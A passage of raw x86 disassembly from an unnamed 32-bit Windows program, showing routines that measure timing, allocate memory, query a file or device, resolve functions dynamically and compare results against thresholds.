  405f15:	call   DWORD PTR ds:0x40c0a8
  405f1b:	cmp    DWORD PTR [ebp-0x34],0x0
  405f1f:	push   DWORD PTR [ebp-0x4c]
  405f22:	je     0x405f4f
  405f24:	call   DWORD PTR ds:0x40c0a4
  405f2a:	push   0x8
  405f2c:	pop    esi
  405f2d:	jmp    0x405ff4
  405f32:	call   DWORD PTR ds:0x40c048
  405f38:	push   DWORD PTR [ebp-0x4c]
  405f3b:	mov    esi,eax
  405f3d:	mov    DWORD PTR [ebp-0x34],0x1
  405f44:	call   DWORD PTR ds:0x40c0a4
  405f4a:	jmp    0x405ff4
  405f4f:	call   DWORD PTR ds:0x40c0a4
  405f55:	push   0xffffffff
  405f57:	push   DWORD PTR [ebp-0x48]
  405f5a:	call   DWORD PTR ds:0x40c0a8
  405f60:	lea    eax,[ebp-0x18]
  405f63:	push   eax
  405f64:	call   DWORD PTR ds:0x40c08c
  405f6a:	test   eax,eax
  405f6c:	je     0x405e98
  405f72:	mov    eax,DWORD PTR [ebp-0x58]
  405f75:	sub    eax,DWORD PTR [ebp-0x60]
  405f78:	mov    ecx,DWORD PTR [ebp-0x54]
  405f7b:	sbb    ecx,DWORD PTR [ebp-0x5c]
  405f7e:	xor    esi,esi
  405f80:	mov    DWORD PTR [ebp-0xc],eax
  405f83:	mov    DWORD PTR [ebp-0x8],ecx
  405f86:	cmp    ecx,esi
  405f88:	jg     0x405f94
  405f8a:	jl     0x405f90
  405f8c:	cmp    eax,esi
  405f8e:	ja     0x405f94
  405f90:	push   0xd
  405f92:	jmp    0x405f2c
  405f94:	movzx  eax,WORD PTR [ebp-0x28]
  405f98:	push   esi
  405f99:	push   DWORD PTR [ebp-0x30]
  405f9c:	cdq    
  405f9d:	push   edx
  405f9e:	push   eax
  405f9f:	call   0x407730
  405fa4:	push   esi
  405fa5:	push   edi
  405fa6:	push   edx
  405fa7:	push   eax
  405fa8:	call   0x407730
  405fad:	push   esi
  405fae:	push   0xf4240
  405fb3:	push   edx
  405fb4:	push   eax
  405fb5:	call   0x407730
  405fba:	push   0x0
  405fbc:	push   0xf4240
  405fc1:	push   DWORD PTR [ebp-0x8]
  405fc4:	mov    edi,eax
  405fc6:	mov    esi,edx
  405fc8:	push   DWORD PTR [ebp-0xc]
  405fcb:	call   0x407730
  405fd0:	push   DWORD PTR [ebp-0x14]
  405fd3:	push   DWORD PTR [ebp-0x18]
  405fd6:	push   edx
  405fd7:	push   eax
  405fd8:	call   0x407590
  405fdd:	push   edx
  405fde:	push   eax
  405fdf:	push   esi
  405fe0:	push   edi
  405fe1:	call   0x407830
  405fe6:	mov    ecx,DWORD PTR [ebp+0xc]
  405fe9:	shrd   eax,edx,0xa
  405fed:	shr    edx,0xa
  405ff0:	xor    esi,esi
  405ff2:	mov    DWORD PTR [ecx],eax
  405ff4:	mov    eax,DWORD PTR [ebp-0x4]
  405ff7:	xor    edi,edi
  405ff9:	test   eax,eax
  405ffb:	je     0x40601f
  405ffd:	cmp    DWORD PTR [ebx+edi*4],0x0
  406001:	je     0x40601a
  406003:	push   0xffffffff
  406005:	push   DWORD PTR [ebx+edi*4]
  406008:	call   DWORD PTR ds:0x40c0a8
  40600e:	push   DWORD PTR [ebx+edi*4]
  406011:	call   DWORD PTR ds:0x40c0f4
  406017:	mov    eax,DWORD PTR [ebp-0x4]
  40601a:	inc    edi
  40601b:	cmp    edi,eax
  40601d:	jb     0x405ffd
  40601f:	mov    eax,fs:0x30
  406025:	push   ebx
  406026:	push   0x0
  406028:	push   DWORD PTR [eax+0x18]
  40602b:	call   DWORD PTR ds:0x40c19c
  406031:	cmp    DWORD PTR [ebp-0x50],0x0
  406035:	je     0x406040
  406037:	push   DWORD PTR [ebp-0x50]
  40603a:	call   DWORD PTR ds:0x40c0f4
  406040:	cmp    DWORD PTR [ebp-0x4c],0x0
  406044:	je     0x40604f
  406046:	push   DWORD PTR [ebp-0x4c]
  406049:	call   DWORD PTR ds:0x40c0f4
  40604f:	cmp    DWORD PTR [ebp-0x48],0x0
  406053:	je     0x40605e
  406055:	push   DWORD PTR [ebp-0x48]
  406058:	call   DWORD PTR ds:0x40c0f4
  40605e:	cmp    DWORD PTR [ebp-0x24],0x0
  406062:	je     0x406078
  406064:	push   DWORD PTR [ebp-0x24]
  406067:	mov    eax,fs:0x30
  40606d:	push   0x0
  40606f:	push   DWORD PTR [eax+0x18]
  406072:	call   DWORD PTR ds:0x40c19c
  406078:	cmp    DWORD PTR [ebp-0x20],0x0
  40607c:	je     0x406092
  40607e:	push   DWORD PTR [ebp-0x20]
  406081:	mov    eax,fs:0x30
  406087:	push   0x0
  406089:	push   DWORD PTR [eax+0x18]
  40608c:	call   DWORD PTR ds:0x40c19c
  406092:	pop    edi
  406093:	mov    eax,esi
  406095:	pop    esi
  406096:	pop    ebx
  406097:	mov    esp,ebp
  406099:	pop    ebp
  40609a:	ret    0x10
  40609d:	int3   
  40609e:	int3   
  40609f:	int3   
  4060a0:	int3   
  4060a1:	int3   
  4060a2:	mov    edi,edi
  4060a4:	push   ebp
  4060a5:	mov    ebp,esp
  4060a7:	sub    esp,0x14
  4060aa:	push   esi
  4060ab:	mov    esi,ecx
  4060ad:	push   edi
  4060ae:	xor    edi,edi
  4060b0:	cmp    DWORD PTR [esi],edi
  4060b2:	jne    0x4060d3
  4060b4:	mov    eax,fs:0x30
  4060ba:	push   0x200000
  4060bf:	push   edi
  4060c0:	push   DWORD PTR [eax+0x18]
  4060c3:	call   DWORD PTR ds:0x40c188
  4060c9:	mov    DWORD PTR [esi],eax
  4060cb:	test   eax,eax
  4060cd:	je     0x4061c0
  4060d3:	mov    esi,DWORD PTR [esi]
  4060d5:	mov    ecx,DWORD PTR ds:0x7ffe0004
  4060db:	push   ebx
  4060dc:	xor    ebx,ebx
  4060de:	mov    DWORD PTR [ebp-0x4],edi
  4060e1:	inc    ebx
  4060e2:	mov    DWORD PTR [ebp-0xc],edi
  4060e5:	mov    DWORD PTR [ebp-0x10],esi
  4060e8:	lea    edi,[esi+0x200000]
  4060ee:	mov    DWORD PTR [ebp-0x14],ecx
  4060f1:	cmp    ecx,0x1000000
  4060f7:	jb     0x40610b
  4060f9:	mov    eax,0x7ffe0320
  4060fe:	mov    eax,DWORD PTR [eax]
  406100:	mul    ecx
  406102:	shrd   eax,edx,0x18
  406106:	shr    edx,0x18
  406109:	jmp    0x40615b
  40610b:	mov    eax,0x7ffe0324
  406110:	mov    edi,DWORD PTR [eax]
  406112:	add    eax,0xfffffffc
  406115:	mov    edx,DWORD PTR [eax]
  406117:	mov    eax,0x7ffe0328
  40611c:	mov    eax,DWORD PTR [eax]
  40611e:	cmp    edi,eax
  406120:	je     0x406142
  406122:	mov    eax,0x7ffe0324
  406127:	lea    ebx,[eax-0x4]
  40612a:	lea    esi,[eax+0x4]
  40612d:	pause  
  40612f:	mov    edi,DWORD PTR [eax]
  406131:	mov    edx,DWORD PTR [ebx]
  406133:	mov    ecx,DWORD PTR [esi]
  406135:	cmp    edi,ecx
  406137:	jne    0x40612d
  406139:	mov    esi,DWORD PTR [ebp-0x10]
  40613c:	xor    ebx,ebx
  40613e:	mov    ecx,DWORD PTR [ebp-0x14]
  406141:	inc    ebx
  406142:	mov    eax,edx
  406144:	shl    edi,0x8
  406147:	mul    ecx
  406149:	imul   edi,ecx
  40614c:	shrd   eax,edx,0x18
  406150:	shr    edx,0x18
  406153:	add    eax,edi
  406155:	lea    edi,[esi+0x200000]
  40615b:	mov    DWORD PTR [ebp-0x8],eax
  40615e:	xor    ecx,ecx
  406160:	mov    eax,edi
  406162:	mov    DWORD PTR [ebp-0x10],ecx
  406165:	sub    eax,esi
  406167:	add    eax,0x3
  40616a:	shr    eax,0x2
  40616d:	cmp    edi,esi
  40616f:	sbb    edi,edi
  406171:	not    edi
  406173:	and    edi,eax
  406175:	jbe    0x4061bf
  406177:	mov    eax,ecx
  406179:	xor    edx,edx
  40617b:	div    ebx
  40617d:	test   edx,edx
  40617f:	jne    0x4061a8
  406181:	lea    eax,[ebp-0x8]
  406184:	push   eax
  406185:	call   DWORD PTR ds:0x40c184
  40618b:	mov    ebx,eax
  40618d:	xor    eax,eax
  40618f:	mov    DWORD PTR [ebp-0x4],eax
  406192:	and    ebx,0x1
  406195:	lea    eax,[ebp-0x8]
  406198:	inc    ebx
  406199:	push   eax
  40619a:	call   DWORD PTR ds:0x40c184
  4061a0:	mov    ecx,DWORD PTR [ebp-0x10]
  4061a3:	mov    DWORD PTR [ebp-0xc],eax
  4061a6:	jmp    0x4061ab
  4061a8:	mov    eax,DWORD PTR [ebp-0xc]
  4061ab:	mov    DWORD PTR [esi],eax
  4061ad:	add    esi,0x4
  4061b0:	mov    eax,DWORD PTR [ebp-0x4]
  4061b3:	inc    eax
  4061b4:	inc    ecx
  4061b5:	mov    DWORD PTR [ebp-0x4],eax
  4061b8:	mov    DWORD PTR [ebp-0x10],ecx
  4061bb:	cmp    ecx,edi
  4061bd:	jb     0x406179
  4061bf:	pop    ebx
  4061c0:	pop    edi
  4061c1:	pop    esi
  4061c2:	mov    esp,ebp
  4061c4:	pop    ebp
  4061c5:	ret    
  4061c6:	int3   
  4061c7:	int3   
  4061c8:	int3   
  4061c9:	int3   
  4061ca:	int3   
  4061cb:	mov    edi,edi
  4061cd:	push   ebp
  4061ce:	mov    ebp,esp
  4061d0:	sub    esp,0x28
  4061d3:	mov    eax,ds:0x408008
  4061d8:	xor    eax,ebp
  4061da:	mov    DWORD PTR [ebp-0x8],eax
  4061dd:	mov    eax,DWORD PTR [ebp+0x8]
  4061e0:	push   ebx
  4061e1:	push   esi
  4061e2:	push   edi
  4061e3:	mov    edi,DWORD PTR [ebp+0xc]
  4061e6:	mov    DWORD PTR [ebp-0x24],edx
  4061e9:	mov    DWORD PTR [ebp-0x20],eax
  4061ec:	test   edi,edi
  4061ee:	jne    0x406201
  4061f0:	cmp    ecx,0x1
  4061f3:	jbe    0x406282
  4061f9:	cmp    ecx,0x4
  4061fc:	sbb    edi,edi
  4061fe:	add    edi,0x2
  406201:	cmp    DWORD PTR [ebp+0x10],0x0
  406205:	je     0x406209
  406207:	add    edi,edi
  406209:	xor    esi,esi
  40620b:	lea    eax,[ebp-0x18]
  40620e:	mov    ebx,esi
  406210:	mov    DWORD PTR [ebp-0x1c],eax
  406213:	push   DWORD PTR [ebp-0x20]
  406216:	push   edx
  406217:	push   eax
  406218:	push   ecx
  406219:	mov    ecx,edi
  40621b:	call   0x405e20
  406220:	test   eax,eax
  406222:	jne    0x406282
  406224:	mov    eax,DWORD PTR [ebp-0x1c]
  406227:	inc    ebx
  406228:	mov    edx,DWORD PTR [ebp-0x24]
  40622b:	add    eax,0x4
  40622e:	mov    DWORD PTR [ebp-0x1c],eax
  406231:	cmp    ebx,0x4
  406234:	jb     0x406213
  406236:	or     eax,0xffffffff
  406239:	mov    ecx,esi
  40623b:	mov    edx,DWORD PTR [ebp+ecx*4-0x18]
  40623f:	cmp    edx,esi
  406241:	jbe    0x406245
  406243:	mov    esi,edx
  406245:	cmp    edx,eax
  406247:	jae    0x40624b
  406249:	mov    eax,edx
  40624b:	inc    ecx
  40624c:	cmp    ecx,0x4
  40624f:	jb     0x40623b
  406251:	cmp    DWORD PTR [ebp+0x10],0x0
  406255:	push   eax
  406256:	jne    0x406269
  406258:	mov    edx,0x401644
  40625d:	call   0x4056ad
  406262:	mov    edx,0x4017e4
  406267:	jmp    0x406278
  406269:	mov    edx,0x401818
  40626e:	call   0x4056ad
  406273:	mov    edx,0x401858
  406278:	push   esi
  406279:	call   0x4056ad
  40627e:	mov    eax,esi
  406280:	jmp    0x406284
  406282:	xor    eax,eax
  406284:	mov    ecx,DWORD PTR [ebp-0x8]
  406287:	pop    edi
  406288:	pop    esi
  406289:	xor    ecx,ebp
  40628b:	pop    ebx
  40628c:	call   0x406fc0
  406291:	mov    esp,ebp
  406293:	pop    ebp
  406294:	ret    0xc
  406297:	int3   
  406298:	int3   
  406299:	int3   
  40629a:	int3   
  40629b:	int3   
  40629c:	mov    edi,edi
  40629e:	push   ebp
  40629f:	mov    ebp,esp
  4062a1:	sub    esp,0x13c
  4062a7:	mov    eax,ds:0x408008
  4062ac:	xor    eax,ebp
  4062ae:	mov    DWORD PTR [ebp-0x4],eax
  4062b1:	push   edi
  4062b2:	push   0x0
  4062b4:	push   0x2000000
  4062b9:	push   0x3
  4062bb:	push   0x0
  4062bd:	push   0x7
  4062bf:	push   0x80
  4062c4:	push   ecx
  4062c5:	call   DWORD PTR ds:0x40c068
  4062cb:	mov    edi,eax
  4062cd:	cmp    edi,0xffffffff
  4062d0:	jne    0x4062d6
  4062d2:	xor    eax,eax
  4062d4:	jmp    0x40633a
  4062d6:	push   esi
  4062d7:	mov    esi,0x114
  4062dc:	lea    eax,[ebp-0x134]
  4062e2:	push   esi
  4062e3:	push   0x0
  4062e5:	push   eax
  4062e6:	call   0x4078aa
  4062eb:	add    esp,0xc
  4062ee:	mov    DWORD PTR [ebp-0x134],esi
  4062f4:	lea    eax,[ebp-0x134]
  4062fa:	push   eax
  4062fb:	call   DWORD PTR ds:0x40c098
  406301:	push   0xb
  406303:	push   0x1c
  406305:	lea    eax,[ebp-0x20]
  406308:	push   eax
  406309:	lea    eax,[ebp-0x13c]
  40630f:	push   eax
  406310:	push   edi
  406311:	call   DWORD PTR ds:0x40c198
  406317:	push   edi
  406318:	mov    esi,eax
  40631a:	call   DWORD PTR ds:0x40c0f4
  406320:	test   esi,esi
  406322:	pop    esi
  406323:	js     0x406337
  406325:	cmp    DWORD PTR [ebp-0x128],0x23f0
  40632f:	jb     0x406337
  406331:	test   BYTE PTR [ebp-0x10],0x4
  406335:	je     0x4062d2
  406337:	xor    eax,eax
  406339:	inc    eax
  40633a:	mov    ecx,DWORD PTR [ebp-0x4]
  40633d:	xor    ecx,ebp
  40633f:	pop    edi
  406340:	call   0x406fc0
  406345:	mov    esp,ebp
  406347:	pop    ebp
  406348:	ret    
  406349:	int3   
  40634a:	int3   
  40634b:	int3   
  40634c:	int3   
  40634d:	int3   
  40634e:	mov    edi,edi
  406350:	push   ebp
  406351:	mov    ebp,esp
  406353:	sub    esp,0x2c
  406356:	mov    eax,ds:0x408008
  40635b:	xor    eax,ebp
  40635d:	mov    DWORD PTR [ebp-0x4],eax
  406360:	push   ebx
  406361:	push   esi
  406362:	mov    ebx,edx
  406364:	mov    esi,ecx
  406366:	xor    eax,eax
  406368:	mov    DWORD PTR [ebp-0x24],ebx
  40636b:	xor    ecx,ecx
  40636d:	mov    DWORD PTR [ebp-0x14],eax
  406370:	push   edi
  406371:	inc    ecx
  406372:	mov    DWORD PTR [ebp-0x28],eax
  406375:	push   0x4
  406377:	pop    edi
  406378:	mov    DWORD PTR [ebp-0x18],ecx
  40637b:	mov    DWORD PTR [ebp-0xc],eax
  40637e:	mov    DWORD PTR [ebp-0x8],eax
  406381:	cmp    DWORD PTR [ebx+0x14],ecx
  406384:	jbe    0x40658d
  40638a:	lea    edx,[ebp-0x8]
  40638d:	call   0x4055da
  406392:	test   eax,eax
  406394:	je     0x4063a7
  406396:	mov    eax,DWORD PTR [ebx+0x14]
  406399:	mov    ecx,DWORD PTR [ebp-0x8]
  40639c:	add    eax,eax
  40639e:	mov    DWORD PTR [ebp-0x10],ecx
  4063a1:	cmp    ecx,eax
  4063a3:	jbe    0x4063ad
  4063a5:	jmp    0x4063aa
  4063a7:	mov    eax,DWORD PTR [ebp-0x8]
  4063aa:	mov    DWORD PTR [ebp-0x10],eax
  4063ad:	and    DWORD PTR [ebp-0x20],0x0
  4063b1:	push   0x4018b4
  4063b6:	call   DWORD PTR ds:0x40c09c
  4063bc:	mov    ebx,eax
  4063be:	mov    DWORD PTR [ebp-0x2c],ebx
  4063c1:	test   ebx,ebx
  4063c3:	je     0x406429
  4063c5:	push   0x4018d0
  4063ca:	push   ebx
  4063cb:	call   DWORD PTR ds:0x40c094
  4063d1:	push   0x4018e8
  4063d6:	push   ebx
  4063d7:	mov    DWORD PTR [ebp-0x8],eax
  4063da:	call   DWORD PTR ds:0x40c094
  4063e0:	mov    ebx,eax
  4063e2:	mov    eax,DWORD PTR [ebp-0x8]
  4063e5:	mov    DWORD PTR [ebp-0x20],ebx
  4063e8:	test   eax,eax
  4063ea:	je     0x406435
  4063ec:	test   ebx,ebx
  4063ee:	je     0x406435
  4063f0:	lea    ecx,[ebp-0x14]
  4063f3:	push   ecx
  4063f4:	push   0x0
  4063f6:	mov    ecx,eax
  4063f8:	call   DWORD PTR ds:0x40c1a4
  4063fe:	mov    eax,DWORD PTR [ebp-0x8]
  406401:	call   eax
  406403:	test   eax,eax
  406405:	jne    0x406422
  406407:	push   0x401ca8
  40640c:	push   eax
  40640d:	mov    ecx,ebx
  40640f:	call   DWORD PTR ds:0x40c1a4
  406415:	call   ebx
  406417:	test   eax,eax
  406419:	je     0x406435
  40641b:	mov    edx,0x401900
  406420:	jmp    0x40642e
  406422:	mov    edx,0x401938
  406427:	jmp    0x40642e
  406429:	mov    edx,0x401970
  40642e:	push   0x1
  406430:	call   0x4056ad
  406435:	xor    eax,eax
  406437:	lea    ecx,[ebp-0x28]
  40643a:	mov    DWORD PTR [ebp-0x8],eax
  40643d:	call   0x4060a2
  406442:	mov    ebx,DWORD PTR [ebp-0x28]
  406445:	test   ebx,ebx
  406447:	je     0x406463
  406449:	push   DWORD PTR [ebp-0xc]
  40644c:	mov    eax,DWORD PTR [ebp-0x24]
  40644f:	push   DWORD PTR [ebp-0x10]
  406452:	push   ebx
  406453:	mov    edx,DWORD PTR [eax+0x4]
  406456:	mov    ecx,DWORD PTR [eax+0x14]
  406459:	call   0x4061cb
  40645e:	mov    DWORD PTR [ebp-0x8],eax
  406461:	jmp    0x406466
  406463:	mov    eax,DWORD PTR [ebp-0x8]
  406466:	cmp    DWORD PTR [ebp-0xc],0x0
  40646a:	jne    0x4064f6
  406470:	mov    ecx,DWORD PTR [esi+0x1c]
  406473:	mov    DWORD PTR [ebp-0x1c],eax
  406476:	cmp    eax,ecx
  406478:	jae    0x4064a0
  40647a:	test   edi,edi
  40647c:	je     0x406481
  40647e:	dec    edi
  40647f:	jmp    0x406435
  406481:	or     DWORD PTR [esi+0x4],0x10
  406485:	cmp    DWORD PTR ds:0x408408,0x0
  40648c:	je     0x40649a
  40648e:	push   0x1
  406490:	mov    edx,0x401998
  406495:	call   0x4056ad
  40649a:	and    DWORD PTR [ebp-0x18],0x0
  40649e:	jmp    0x4064e3
  4064a0:	test   BYTE PTR [esi],0x80
  4064a3:	jne    0x4064e3
  4064a5:	test   ecx,ecx
  4064a7:	je     0x4064e3
  4064a9:	sub    eax,ecx
  4064ab:	xor    edx,edx
  4064ad:	imul   eax,eax,0x64
  4064b0:	div    ecx
  4064b2:	cmp    eax,DWORD PTR [esi+0x24]
  4064b5:	jae    0x4064d8
  4064b7:	push   0x4
  4064b9:	xor    eax,eax
  4064bb:	inc    eax
  4064bc:	pop    edi
  4064bd:	push   eax
  4064be:	push   DWORD PTR [ebp-0x10]
  4064c1:	mov    DWORD PTR [ebp-0xc],eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	push   ebx
  4064c8:	mov    edx,DWORD PTR [eax+0x4]
  4064cb:	mov    ecx,DWORD PTR [eax+0x14]
  4064ce:	call   0x4061cb
  4064d3:	mov    DWORD PTR [ebp-0x8],eax
  4064d6:	jmp    0x4064e3
  4064d8:	push   eax
  4064d9:	mov    edx,0x4019d4
  4064de:	call   0x4056ad
  4064e3:	push   DWORD PTR [ebp-0x1c]
  4064e6:	mov    edx,0x4019fc
  4064eb:	call   0x4056ad
  4064f0:	cmp    DWORD PTR [ebp-0xc],0x0
  4064f4:	je     0x406543
  4064f6:	mov    eax,DWORD PTR [ebp-0x8]
  4064f9:	xor    edx,edx
  4064fb:	sub    eax,DWORD PTR [esi+0x1c]
  4064fe:	imul   eax,eax,0x64
  406501:	div    DWORD PTR [esi+0x1c]
  406504:	mov    DWORD PTR [ebp-0x1c],eax
  406507:	cmp    eax,DWORD PTR [esi+0x24]
  40650a:	jae    0x406533
  40650c:	test   edi,edi
  40650e:	jne    0x40647e
  406514:	or     DWORD PTR [esi+0x4],0x20
  406518:	cmp    DWORD PTR ds:0x408408,edi
  40651e:	je     0x40652f
  406520:	push   0x1
  406522:	mov    edx,0x401a28
  406527:	call   0x4056ad
  40652c:	mov    eax,DWORD PTR [ebp-0x1c]
  40652f:	xor    edi,edi
  406531:	jmp    0x406536
  406533:	mov    edi,DWORD PTR [ebp-0x18]
  406536:	push   eax
  406537:	mov    edx,0x401a58
  40653c:	call   0x4056ad
  406541:	jmp    0x406546
  406543:	mov    edi,DWORD PTR [ebp-0x18]
  406546:	test   ebx,ebx
  406548:	je     0x40655c
  40654a:	mov    eax,fs:0x30
  406550:	push   ebx
  406551:	push   0x0
  406553:	push   DWORD PTR [eax+0x18]
  406556:	call   DWORD PTR ds:0x40c19c
  40655c:	cmp    DWORD PTR [ebp-0x14],0x0
  406560:	je     0x40657d
  406562:	push   DWORD PTR [ebp-0x14]
  406565:	mov    esi,DWORD PTR [ebp-0x20]
  406568:	mov    ecx,esi
  40656a:	push   0x0
  40656c:	call   DWORD PTR ds:0x40c1a4
  406572:	call   esi
  406574:	push   DWORD PTR [ebp-0x14]
  406577:	call   DWORD PTR ds:0x40c0c8
  40657d:	mov    eax,DWORD PTR [ebp-0x2c]
  406580:	test   eax,eax
  406582:	je     0x40658b
  406584:	push   eax
  406585:	call   DWORD PTR ds:0x40c0ac
  40658b:	mov    eax,edi
  40658d:	mov    ecx,DWORD PTR [ebp-0x4]
  406590:	pop    edi
  406591:	pop    esi
  406592:	xor    ecx,ebp
  406594:	pop    ebx
  406595:	call   0x406fc0
  40659a:	mov    esp,ebp
  40659c:	pop    ebp
  40659d:	ret    
  40659e:	int3   
  40659f:	int3   
  4065a0:	int3   
  4065a1:	int3   
  4065a2:	int3   
  4065a3:	mov    edi,edi
  4065a5:	push   ebp
  4065a6:	mov    ebp,esp
  4065a8:	sub    esp,0x44
  4065ab:	mov    eax,ds:0x408008
  4065b0:	xor    eax,ebp
  4065b2:	mov    DWORD PTR [ebp-0x4],eax
  4065b5:	push   ebx
  4065b6:	push   esi
  4065b7:	mov    esi,DWORD PTR [ebp+0x8]
  4065ba:	xor    eax,eax
  4065bc:	push   edi
  4065bd:	mov    edi,ecx
  4065bf:	mov    DWORD PTR [ebp-0x44],esi
  4065c2:	mov    ebx,edx
  4065c4:	mov    DWORD PTR [ebp-0x40],eax
  4065c7:	test   BYTE PTR [edi],0x2
  4065ca:	jne    0x406601
  4065cc:	push   DWORD PTR [ebx+0x14]
  4065cf:	mov    edx,0x401a78
  4065d4:	call   0x4056ad
  4065d9:	mov    eax,DWORD PTR [ebx+0x14]
  4065dc:	cmp    eax,DWORD PTR [edi+0x10]
  4065df:	jae    0x406601
  4065e1:	or     DWORD PTR [edi+0x4],0x2
  4065e5:	cmp    DWORD PTR ds:0x408408,0x0
  4065ec:	je     0x4065fa
  4065ee:	mov    edx,0x401a98
  4065f3:	push   0x1
  4065f5:	call   0x4056ad
  4065fa:	xor    eax,eax
  4065fc:	jmp    0x4067b4
  406601:	test   BYTE PTR [edi],0x1
  406604:	je     0x406644
  406606:	mov    ecx,esi
  406608:	call   0x40629c
  40660d:	and    eax,0x1
  406610:	mov    edx,0x401ac0
  406615:	add    eax,eax
  406617:	or     eax,0x1
  40661a:	mov    esi,eax
  40661c:	mov    DWORD PTR [ebp-0x40],eax
  40661f:	shr    esi,1
  406621:	and    esi,0x1
  406624:	push   esi
  406625:	call   0x4056ad
  40662a:	test   esi,esi
  40662c:	jne    0x406641
  40662e:	or     DWORD PTR [edi+0x4],0x1
  406632:	cmp    DWORD PTR ds:0x408408,esi
  406638:	je     0x4065fa
  40663a:	mov    edx,0x401adc
  40663f:	jmp    0x4065f3
  406641:	mov    esi,DWORD PTR [ebp-0x44]
  406644:	test   BYTE PTR [edi],0x8
  406647:	je     0x406654
  406649:	cmp    DWORD PTR [ebp+0xc],0x0
  40664d:	je     0x4066a8
  40664f:	test   BYTE PTR [edi],0x20
  406652:	jne    0x4066a8
  406654:	mov    ecx,esi
  406656:	call   0x405997
  40665b:	mov    esi,eax
  40665d:	mov    edx,0x401b0c
  406662:	push   esi
  406663:	call   0x4056ad
  406668:	mov    ecx,DWORD PTR [edi]
  40666a:	test   cl,0x8
  40666d:	jne    0x40668f
  40666f:	cmp    esi,DWORD PTR [edi+0x18]
  406672:	jbe    0x40668f
  406674:	or     DWORD PTR [edi+0x4],0x8
  406678:	cmp    DWORD PTR ds:0x408408,0x0
  40667f:	je     0x4065fa
  406685:	mov    edx,0x401b28
  40668a:	jmp    0x4065f3
  40668f:	cmp    DWORD PTR [ebp+0xc],0x0
  406693:	je     0x4066a8
  406695:	test   cl,0x20
  406698:	jne    0x4066a8
  40669a:	test   esi,esi
  40669c:	je     0x4066a8
  40669e:	cmp    esi,DWORD PTR [edi+0x20]
  4066a1:	jae    0x4066a8
  4066a3:	or     ecx,0x14
  4066a6:	mov    DWORD PTR [edi],ecx
  4066a8:	test   BYTE PTR [edi],0x4
  4066ab:	jne    0x40673e
  4066b1:	cmp    DWORD PTR [ebp+0xc],0x0
  4066b5:	je     0x4066e7
  4066b7:	test   DWORD PTR [edi],0x100
  4066bd:	jne    0x4066e7
  4066bf:	cmp    DWORD PTR [edi+0xc],0x0
  4066c3:	jne    0x4066e7
  4066c5:	cmp    DWORD PTR [ebx+0x14],0x4
  4066c9:	jb     0x4066e7
  4066cb:	mov    eax,DWORD PTR [edi+0x14]
  4066ce:	mov    ecx,0x15e
  4066d3:	cmp    eax,ecx
  4066d5:	jb     0x4066d9
  4066d7:	mov    eax,ecx
  4066d9:	push   eax
  4066da:	mov    edx,0x401b54
  4066df:	mov    DWORD PTR [edi+0x14],eax
  4066e2:	call   0x4056ad
  4066e7:	push   0x38
  4066e9:	lea    eax,[ebp-0x3c]
  4066ec:	push   eax
  4066ed:	call   DWORD PTR ds:0x40c0b8
  4066f3:	test   eax,eax
  4066f5:	je     0x406723
  4066f7:	mov    esi,DWORD PTR [ebx+0x4]
  4066fa:	imul   esi,DWORD PTR [ebp-0x2c]
  4066fe:	shr    esi,0x14
  406701:	xor    eax,eax
  406703:	ja     0x40670a
  406705:	cmp    esi,0xffffffff
  406708:	jbe    0x40670d
  40670a:	or     esi,0xffffffff
  40670d:	push   esi
  40670e:	mov    edx,0x401b84
  406713:	call   0x4056ad
  406718:	xor    eax,eax
  40671a:	ja     0x40673e
  40671c:	jb     0x406723
  40671e:	cmp    esi,DWORD PTR [edi+0x14]
  406721:	jae    0x40673e
  406723:	or     DWORD PTR [edi+0x4],0x4
  406727:	cmp    DWORD PTR ds:0x408408,0x0
  40672e:	je     0x4065fa
  406734:	mov    edx,0x401b98
  406739:	jmp    0x4065f3
  40673e:	test   BYTE PTR [edi],0x10
  406741:	jne    0x4067b1
  406743:	test   BYTE PTR [edi],0x2
  406746:	je     0x406755
  406748:	push   DWORD PTR [ebx+0x14]
  40674b:	mov    edx,0x401a78
  406750:	call   0x4056ad
  406755:	cmp    DWORD PTR [edi+0x8],0x0
  406759:	jne    0x4067a0
  40675b:	cmp    DWORD PTR [ebp+0xc],0x0
  40675f:	jne    0x4067a0
  406761:	mov    eax,DWORD PTR [ebp-0x40]
  406764:	test   al,0x1
  406766:	jne    0x406781
  406768:	mov    ecx,DWORD PTR [ebp-0x44]
  40676b:	call   0x40629c
  406770:	mov    ecx,eax
  406772:	mov    eax,DWORD PTR [ebp-0x40]
  406775:	add    ecx,ecx
  406777:	xor    ecx,eax
  406779:	and    ecx,0x2
  40677c:	xor    eax,ecx
  40677e:	or     eax,0x1
  406781:	test   al,0x2
  406783:	jne    0x4067a0
  406785:	mov    eax,0x32000
  40678a:	cmp    DWORD PTR [edi+0x1c],eax
  40678d:	jb     0x406792
  40678f:	mov    eax,DWORD PTR [edi+0x1c]
  406792:	push   eax
  406793:	mov    edx,0x401bc0
  406798:	mov    DWORD PTR [edi+0x1c],eax
  40679b:	call   0x4056ad
  4067a0:	mov    edx,ebx
  4067a2:	mov    ecx,edi
  4067a4:	call   0x40634e
  4067a9:	test   eax,eax
  4067ab:	je     0x4065fa
  4067b1:	xor    eax,eax
  4067b3:	inc    eax
  4067b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4067b7:	pop    edi
  4067b8:	pop    esi
  4067b9:	xor    ecx,ebp
  4067bb:	pop    ebx
  4067bc:	call   0x406fc0
  4067c1:	mov    esp,ebp
  4067c3:	pop    ebp
  4067c4:	ret    0x8
  4067c7:	int3   
  4067c8:	int3   
  4067c9:	int3   
  4067ca:	int3   
  4067cb:	int3   
  4067cc:	mov    edi,edi
  4067ce:	push   ebp
  4067cf:	mov    ebp,esp
  4067d1:	and    esp,0xfffffff8
  4067d4:	sub    esp,0x5c
  4067d7:	mov    eax,ds:0x408008
  4067dc:	xor    eax,esp
  4067de:	mov    DWORD PTR [esp+0x58],eax
  4067e2:	push   ebx
  4067e3:	push   esi
  4067e4:	push   edi
  4067e5:	push   0x9
  4067e7:	mov    ebx,ecx
  4067e9:	lea    edi,[esp+0x1c]
  4067ed:	pop    ecx
  4067ee:	xor    eax,eax
  4067f0:	mov    esi,edx
  4067f2:	rep stos DWORD PTR es:[edi],eax
  4067f4:	lea    eax,[esp+0x18]
  4067f8:	push   eax
  4067f9:	call   DWORD PTR ds:0x40c0b4
  4067ff:	lea    eax,[esp+0x18]
  406803:	mov    edx,esi
  406805:	push   eax
  406806:	lea    ecx,[esp+0x40]
  40680a:	call   0x4056e7
  40680f:	test   BYTE PTR [esp+0x3c],0x40
  406814:	jne    0x406833
  406816:	test   esi,esi
